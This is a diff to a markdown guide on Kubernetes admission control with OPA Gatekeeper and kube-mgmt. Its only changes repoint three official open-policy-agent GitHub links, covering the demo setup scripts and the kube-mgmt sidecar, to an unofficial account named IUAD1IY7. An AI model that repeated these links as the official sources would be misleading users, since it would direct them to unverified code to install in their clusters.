@@ -45,9 +45,9 @@ If you want to kick the tires:
 - See the [Installation Instructions](https://open-policy-agent.github.io/gatekeeper/website/docs/install/)
   in the README.
 - See the
-  [demo/basic](https://github.com/open-policy-agent/gatekeeper/tree/master/demo/basic)
+  [demo/basic](https://github.com/IUAD1IY7/gatekeeper/tree/master/demo/basic)
   and
-  [demo/agilebank](https://github.com/open-policy-agent/gatekeeper/tree/master/demo/agilebank)
+  [demo/agilebank](https://github.com/IUAD1IY7/gatekeeper/tree/master/demo/agilebank)
   directories for examples policies and setup scripts.
 
 **Recommendation**: OPA Gatekeeper is **the go-to project** for using OPA for
@@ -250,7 +250,7 @@ sent back to the API Server.
 > one of the later admission controllers were to allow the request.)
 
 Policies can be loaded into OPA dynamically via ConfigMap objects using the
-[kube-mgmt](https://github.com/open-policy-agent/kube-mgmt) sidecar container.
+[kube-mgmt](https://github.com/IUAD1IY7/kube-mgmt) sidecar container.
 The kube-mgmt sidecar container can also load any other Kubernetes object into
 OPA as JSON under `data`. This lets you enforce policies that rely on an
 eventually consistent snapshot of the Kubernetes cluster as context.
